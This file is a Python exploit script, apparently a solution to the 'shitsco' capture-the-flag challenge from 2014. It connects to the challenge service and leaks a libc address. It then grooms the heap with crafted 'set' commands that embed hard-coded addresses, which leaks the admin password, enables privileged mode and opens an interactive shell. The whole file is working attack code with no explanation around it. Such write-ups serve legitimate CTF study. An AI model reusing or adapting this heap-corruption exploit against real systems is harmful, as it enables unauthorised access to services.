from isis import *

libc_leak_pat="isn't (.*)"
heap_ptr_pat=': (.*)'

SLEEP_TIME=.1

leak_libc_offset=1728500
password_offset=0x804C3A0
first_allocation_only=0x804C370

ping_s=0x08049AB5+5
tracert_s=0x8049ADB



def enable(s,password):
	s.send('enable\n')
	time.sleep(SLEEP_TIME)
	s.send('{}\n'.format(password))
	time.sleep(SLEEP_TIME)

def enable_leak(s): 
	"""return base addr of libc"""
	enable(s,"")
	buf=s.recv(0x10000)
	leak=re.findall(libc_leak_pat,buf)[0]
	#return ulei(leak)[1]-leak_libc_offset
	return ulei(leak)

def manip_heap(s):
	first=lei(ping_s,ping_s,
			  password_offset,password_offset)

	last=lei(tracert_s,password_offset,
			first_allocation_only,first_allocation_only)
	waste='A'*16
	#s.send('set {} {}\n'.format(waste,waste ))

	blocks=[first,'b','c']
	for i in blocks:
		s.send('set {} {}\n'.format(i,i))
	for i in blocks:
		s.send('set {}\n'.format(i))
	s.send('set {} {}\n'.format(last,last))
	
	time.sleep(SLEEP_TIME)
	junk = s.recv(0x10000)
	s.send('show\n')
	time.sleep(SLEEP_TIME)
	buf  = s.recv(0x10000)

	leak= re.findall(heap_ptr_pat, buf)[1]
	print leak
	enable(s,leak+'\0')


chal=('shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me',31337) 
chal=('localhost',2323) 

#s=get_socket(('localhost',2323))
s=get_socket(chal)

#print map(hex,enable_leak(s))
manip_heap(s)

time.sleep(SLEEP_TIME)
telnet_shell(s)
